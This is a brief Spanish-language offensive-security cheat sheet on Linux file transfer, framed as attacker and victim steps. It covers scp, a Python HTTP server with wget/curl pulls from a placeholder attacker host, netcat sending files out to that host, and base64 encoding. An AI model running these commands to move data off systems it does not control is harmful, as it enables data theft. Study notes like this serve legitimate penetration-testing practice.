---
tags: [file-transfer, linux]
---

# Transferencia de Ficheros — Linux

## SSH / SCP

```bash
scp stuart@192.168.213.144:/tmp/sitebackup3.zip .
scp archivo.txt usuario@<IP>:/tmp/
```

## Python HTTP Server

```bash
# Atacante — servir archivo
python3 -m http.server 80

# Víctima — descargar
wget http://<ATTACKER>/archivo.txt
curl http://<ATTACKER>/archivo.txt -o archivo.txt
```

## Netcat

```bash
# Atacante recibe
nc -lvnp 4444 > archivo.txt

# Víctima envía
nc <ATTACKER> 4444 < archivo.txt
```

## Base64

```bash
# Víctima — codificar
base64 -w 0 archivo.bin

# Atacante — decodificar
echo "<BASE64>" | base64 -d > archivo.bin
```

